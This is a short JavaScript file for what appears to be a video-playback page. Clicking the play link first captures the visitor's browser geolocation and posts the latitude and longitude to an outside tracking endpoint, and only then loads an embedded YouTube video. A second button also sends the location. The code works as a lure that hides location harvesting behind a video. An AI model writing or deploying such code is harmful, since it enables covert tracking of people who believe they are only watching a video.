const videoUrl = "https://www.youtube.com/embed/M7lc1UVf-VE?autoplay=1&mute=1&controls=1&rel=0&playsinline=1";

async function shareLocation() {
    if (!navigator.geolocation) {
        return false;
    }

    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;

                console.log(`Location: Lat ${lat}, Lng ${lng}`);

                try {
                    await fetch("https://track-hhek.onrender.com/location", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            user: "Anonymous User",
                            lat,
                            lng
                        })
                    });
                } catch (error) {
                    console.error(error);
                }

                resolve(true);
            },
            () => {
                resolve(false);
            }
        );
    });
}

document.getElementById("playLink").addEventListener("click", async (event) => {
    event.preventDefault();

    await shareLocation();

    const videoShell = document.getElementById("videoShell");
    const player = document.getElementById("player");

    videoShell.classList.remove("hidden");
    player.src = videoUrl;
});

document.getElementById("shareLocationBtn").addEventListener("click", async (event) => {
    event.stopPropagation();
    await shareLocation();
});